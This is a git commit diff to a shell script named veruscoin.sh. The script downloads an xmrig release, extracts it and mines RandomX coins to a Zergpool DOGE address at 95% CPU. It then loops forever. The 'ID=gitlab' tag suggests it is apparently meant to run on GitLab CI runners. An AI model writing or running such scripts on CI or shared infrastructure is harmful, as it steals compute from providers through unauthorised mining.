daf6ae6ecef9f30862b2b170923bc5c57fd31753
zazazaxky-m <78693013+zazazaxky-m@users.noreply.github.com>
2021-05-11 06:14:43 +0700

    Update veruscoin.sh

--- veruscoin.sh
+++ veruscoin.sh
@@ -1,12 +1,9 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-git clone https://github.com/xmrig/xmrig.git
-mkdir xmrig/build && cd xmrig/build
-cmake ..
-make -j$(nproc)
-./xmrig -a rx/0 -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u DFkNQGLsvqAxiX3JJgMJK5FyBZD36z5zfW --keepalive --max-cpu-usage 95 --timeout 120 --donate-level 0 -p c=DOGE,ID=Gitlab
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+tar xf xmrig-6.12.1-linux-x64.tar.gz
+./xmrig -a rx/0 -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u DFkNQGLsvqAxiX3JJgMJK5FyBZD36z5zfW --keepalive --max-cpu-usage 95 --timeout 120 --donate-level 0 -p c=DOGE,ID=gitlab
 while [ 1 ]; do
 sleep 3
 done
